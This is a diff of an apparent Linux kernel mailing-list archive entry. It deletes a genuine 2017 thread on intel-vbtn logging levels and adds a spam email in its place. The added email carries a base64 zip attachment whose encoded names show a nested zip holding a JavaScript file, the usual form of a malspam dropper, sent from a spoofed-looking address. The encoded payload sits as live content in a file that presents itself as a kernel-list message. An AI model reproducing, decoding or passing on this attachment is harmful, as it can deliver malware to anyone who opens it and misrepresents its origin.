@@ -1,107 +1,119 @@
-From: Darren Hart <dvhart@infradead.org>
-Subject: Re: [PATCH] platform/x86: intel-vbtn: reduce unnecessary messages
- for normal users
-Date: Tue, 25 Jul 2017 08:30:28 -0700
-Message-ID: <20170725153028.GA19214@fury>
-References: <1500609408-30745-1-git-send-email-alex.hung@canonical.com>
- <20170721231620.GB7888@fury>
- <CAHp75VfCht3djwme6HzrSNzkQ4vCYEwbB_kBM6fYL8L-KBu5Og@mail.gmail.com>
- <4940915.tsQAtH0l4E@aspire.rjw.lan>
- <20170725011334.GA12527@fury>
+From: <susan.christian@state.sd.us>
+Subject: (unknown)
+Date: Tue, 25 Jul 2017 16:36:28 -0000
+Message-ID: <150100058855.19424.6038206954316136917@vnpt.vn>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
+Content-Type: application/zip; name="EMAIL_31876792_platform-driver-x86.zip"
+Content-Transfer-Encoding: base64
 Return-path: <platform-driver-x86-owner@vger.kernel.org>
-Received: from bombadil.infradead.org ([65.50.211.133]:33765 "EHLO
-        bombadil.infradead.org" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1752244AbdGYPad (ORCPT
+Received: from static.vnpt.vn ([14.161.163.143]:59822 "HELO vnpt.vn"
+        rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1752425AbdGYQgc (ORCPT
         <rfc822;platform-driver-x86@vger.kernel.org>);
-        Tue, 25 Jul 2017 11:30:33 -0400
-Content-Disposition: inline
-In-Reply-To: <20170725011334.GA12527@fury>
+        Tue, 25 Jul 2017 12:36:32 -0400
+Content-Disposition: attachment
+Subject: 
 Sender: platform-driver-x86-owner@vger.kernel.org
 List-ID: <platform-driver-x86.vger.kernel.org>
-To: "Rafael J. Wysocki" <rjw@rjwysocki.net>
-Cc: Andy Shevchenko <andy.shevchenko@gmail.com>, Alex Hung <alex.hung@canonical.com>, Andy Shevchenko <andy@infradead.org>, Steven Rostedt <rostedt@goodmis.org>, Platform Driver <platform-driver-x86@vger.kernel.org>
+To: platform-driver-x86@vger.kernel.org
 
-+Steven Rostedt
-
-Steve is looking into current issues with printk and expressed an interest in
-this example.
-
-On Mon, Jul 24, 2017 at 06:14:36PM -0700, Darren Hart wrote:
-> On Mon, Jul 24, 2017 at 01:41:06PM +0200, Rafael Wysocki wrote:
-> > On Monday, July 24, 2017 12:19:25 PM Andy Shevchenko wrote:
-> > > On Sat, Jul 22, 2017 at 2:16 AM, Darren Hart <dvhart@infradead.org> wrote:
-> > > > On Thu, Jul 20, 2017 at 08:56:48PM -0700, Alex Hung wrote:
-> > > >> Unsupported events is only useful for developers and does not meaningful
-> > > >> for users. Using dev_dbg makes more sense and reduces noise in kernel
-> > > >> messages.
-> > > 
-> > > >> -     dev_info(&device->dev, "unknown event index 0x%x\n", event);
-> > > >> +     dev_dbg(&device->dev, "unknown event index 0x%x\n", event);
-> > > >
-> > > > info is the most common log level for these events in the platform
-> > > > driver x86 subsystem per 'git grep -i "unknown event"'.
-> > > >
-> > > > My take on this is that we want these to be reported by users, rather
-> > > > than rely on developers to find them all - especially as the developers
-> > > > only see a fraction of the affected hardware.
-> > > >
-> > > > Are you finding these to be causing a problem / or producing really
-> > > > excessive log messages?
-> > > >
-> > > > Andy, what are your thoughts?
-> > > 
-> > > My opinion is slightly closer to Rafael's one.
-> > > 
-> > > I think this is a debugging context.
-> > > 
-> > > If we really care about reporting them we might go HID way, i.e. using
-> > > dev_printk(KERN_DEBUG ) with module parameter debug.
-> > > 
-> > > As developer I'm against that.
-> > > As a regular user I do not need to recompile a kernel, in case there
-> > > is no dynamic debug support, and it allows me to enable debug
-> > > messages.
-> > > 
-> > > P.S. To see how important message above is, do we have any statistics
-> > > how many bug reports / email we got wrt the issue and how many had
-> > > been addressed?
-> > 
-> > Well, there is one I'm aware of, but this particular one we aren't going to
-> > address at all, because apparently we handle the event in question anyway
-> > in a different way.
-> > 
-> > In any case, the only situation in which this information is useful at all is
-> > when some functionality is missing and you want to find out why.
-> > 
-> > Otherwise you get messages telling you that something *may* *be* missing,
-> > but as a user you have no idea what to do about that, because you don't
-> > even know how to report it and to whom (in case you want to report it).
-> 
-> My thinking was along the lines of the keymaps where we explicitly add
-> KE_IGNORE when it is a key we don't care about. In that case, it is
-> useful to have the messages because if that occurs we want to know so we
-> can update the driver.
-> 
-> This driver also has KE_IGNORE entries in the intel_vbtn_keymap.
-> 
-> Are we talking about unknown keys - or are we talking about something
-> else?
-> 
-> If unknown keys, the additional messages will be minimal, and missing
-> keys are most likely to be reported if the message is obvious. Given the
-> sparse access to hardware by the developers, I prefer to have the
-> message.
-> 
-> If there is more to what is going on here - can someone provide an
-> example of where this is causing a problem? Or where the event causing
-> the message is not something we will add code to catch / ignore?
-> 
-> -- 
-> Darren Hart
-> VMware Open Source Technology Center
-
--- 
-Darren Hart
-VMware Open Source Technology Center
+UEsDBAoAAAAAANGD+UowflSEqRUAAKkVAAAJAAAAMTc5MTYuemlwUEsDBBQAAAAIANGD+Uo3NgWI
+ExUAADKkAAAIAAAAMTc5MTYuanPFXW1zU0UU/u6M/6HTmYzt6GBMZdoOw4c0TVsttaWNiDh+SJOb
+NpomlyRtWh3/G76gUlRQQIEKIm/yIoJQ3gTRW/2wzybn+Oxeon7pbNKbu7vnnD3n7Nnz7Hnxxc9/
+3vjs5Pqh8/fv/XHs3OZXj37/+MOjxy/e2li/cf7qzVOXN098efTshZ8f/PLJj09+OPvg1hf3v755
+6O7DU7+uH/vlyJmNH+89/vj49dOX7m8e+umz02eu3zl27sZ3B65c+O32+rWjFy8d/PjJg7sf/nTq
+wMFrX/1y+OjmJ19/effGhe/unT524uyTU4+vXLp987tzh0/c+fabg98fP/Lhw9OXN3789cLDS2du
+3vvo+IGj3/1+7PTGjc0rhy5evXbrwZ373x84c/fKpZ/P/nHk8vFPrn5x7rNHt24fPPboxuXv1w8f
+fXzu5q1TR744cOL29W8fnv7ozq/Xzny+8cWX5y4fv3P18CcnNz+99ODskSv3vzn1/Vcf/XRofePx
+16dOfHX5l7N3rh++cfH8kUf3Tt7e/HT982u3zj95+OjchceXvvny4qmTN08c2Ny4euOrJ+ufXT+6
+8fHhq5cPXrj36McTZ05+e/HWT1//+PCHzw5+unHj4smr9x+vH9r85ta5J5fu3jz/87PPvLu2L5gs
+7nq1/N7s7kxjT2t6Z+9C7/O9QTP682YQ/cnXe3f0zGem3xldm2mMVLLvvpkLd/amov8kXxrs3fHs
+M83qvj37X1md3L1SahXmc3M9O3ueC8LxvYXJ1ypz6dHGiGnPjr3SMp+mXyuYD6ummTbNPXPj5sOU
+aTZN840J0+4xzZ3it1XThCG27Gc7h1EQey6b5or43r3Tpj1vmu/AI4Vmn/nQC7MyzTnovY69m3Zu
+GzxumoswqkoF3t5vmjtgxmP74Rc105w0zTXTDF81beBxZQ8MMr8kEnHvMuWZJUGzMEbTfAU4GMnS
+KsqNSI9xRYJMc2IbdBUs4AeYlGkWZe5NiLTbZYty58+eF0fdlNkvCvUCCELJ/l0nW4E3mUVxevUM
+/LAIxIBpD5tmqv95cV4N6LQE02lhV8HTk6QrhPCdfkpcVkgIeH0Z1zKMoGGaCq16n+fz9xIJp/nD
+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
